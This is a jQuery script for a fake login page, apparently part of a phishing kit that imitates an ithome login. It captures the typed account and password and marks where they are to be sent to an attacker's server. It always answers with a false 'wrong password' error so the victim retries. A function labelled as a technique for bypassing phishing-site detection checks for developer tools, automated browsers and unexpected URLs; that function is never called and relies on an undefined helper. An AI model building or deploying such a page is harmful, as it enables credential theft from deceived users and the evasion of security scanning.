$(document).ready(function() {
    // 監聽登入按鈕點擊事件
    $("#loginBtn").click(function() {
        handleLogin();
    });
    
    // 按 Enter 鍵提交
    $("#account, #password").keypress(function(e) {
        if (e.which === 13) {
            handleLogin();
            return false;
        }
    });
    
    // 顯示密碼切換
    $(".toggle-password").click(function() {
        const input = $(this).prev('input');
        if (input.attr("type") === "password") {
            input.attr("type", "text");
            $(this).find('i').removeClass("fa-eye").addClass("fa-eye-slash");
        } else {
            input.attr("type", "password");
            $(this).find('i').removeClass("fa-eye-slash").addClass("fa-eye");
        }
    });
    
    // 登入處理函數
    function handleLogin() {
        const account = $("#account").val().trim();
        const password = $("#password").val().trim();
        
        // 基本驗證
        if (account === "") {
            showError("請輸入帳號");
            $("#account").focus();
            return false;
        }
        
        if (password === "") {
            showError("請輸入密碼");
            $("#password").focus();
            return false;
        }
        
        // 捕獲輸入的帳號密碼
        console.log("捕獲帳號:", account);
        console.log("捕獲密碼:", password);
        
        // 顯示登入中狀態
        $("#loginBtn").prop("disabled", true).html('<i class="fas fa-spinner fa-spin mr-2"></i> 登入中...');
        
        // 模擬API請求延遲
        setTimeout(function() {
            // 這裡可以將資料發送到您的伺服器
            
            // 重定向到假的成功頁面或顯示錯誤
            showError("帳號或密碼錯誤，請重新輸入");
            $("#loginBtn").prop("disabled", false).html('登入');
        }, 1500);
    }
    
    // 顯示錯誤訊息
    function showError(message) {
        if ($(".error-message").length === 0) {
            $('<div class="error-message text-danger mb-3"></div>').insertBefore("#loginBtn");
        }
        $(".error-message").text(message).show();
    }
    
    // 檢測是否在真實環境中運行 (釣魚網站檢測繞過技巧)
    function checkEnvironment() {
        // 檢測開發者工具
        const devtools = /./;
        devtools.toString = function() {
            checkDevTools();
            return '';
        }
        console.log('%c', devtools);
        
        // 檢測瀏覽器特徵
        if (navigator.webdriver) {
            console.log("可能是自動測試環境");
        }
        
        // 檢測URL與referrer
        const currentURL = window.location.href;
        if (!currentURL.includes("fake.ithome") && !currentURL.includes("localhost")) {
            console.log("非預期的訪問來源");
        }
    }
});